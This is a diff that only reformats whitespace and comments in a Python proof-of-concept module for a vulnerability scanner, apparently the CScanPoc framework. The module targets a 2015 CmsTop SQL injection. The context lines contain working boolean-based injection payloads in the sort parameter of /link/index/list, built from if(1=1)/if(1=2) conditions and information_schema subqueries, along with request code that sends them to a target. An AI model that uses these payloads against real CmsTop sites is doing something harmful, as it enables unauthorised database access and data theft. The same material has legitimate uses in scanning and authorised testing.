@@ -3,11 +3,12 @@
 from CScanPoc.thirdparty import requests
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 
+
 class Vuln(ABVuln):
-    vuln_id = 'CmsTop_0003_L' # 平台漏洞编号，留空
+    vuln_id = 'CmsTop_0003_L'  # 平台漏洞编号，留空
     name = 'CmsTop SQL注入'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.INJECTION # 漏洞类型
+    type = VulnType.INJECTION  # 漏洞类型
     disclosure_date = '2015-10-09'  # 漏洞公布时间
     desc = '''
         注册账号后，在选择链接分类的时候，会发生如下链接
@@ -34,17 +35,17 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
-            #首先注册用户登录。
+
+            # 首先注册用户登录。
             s = requests.session()
-            #获取cookies
+            # 获取cookies
             cookies = {}
             '''
             raw_cookies = 'bid=xxxxx;_pk_ref.100001.8cb4=xxxxxxx;__utma=xxxxx'
             for line in raw_cookies.split(';'):  
                 key,value=line.split('=',1)#1代表只分一次，得到两个数据  
                 cookies[key]=value 
-            ''' 
+            '''
             s.get(self.target, cookies=cookies)
             payload_normal = "/link/index/list?type=1&offset=0&limit=50&_=1440172313381&sort=desc,if(1=1,1,1)='1',1,(select%201%20from%20information_schema.TABLES))&category=2"
             payload_abnormal = "/link/index/list?type=1&offset=0&limit=50&_=1440172313381&sort=desc,if(1=2,1)='1',1,(select%201%20from%20information_schema.TABLES))&category=2"
@@ -62,6 +63,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
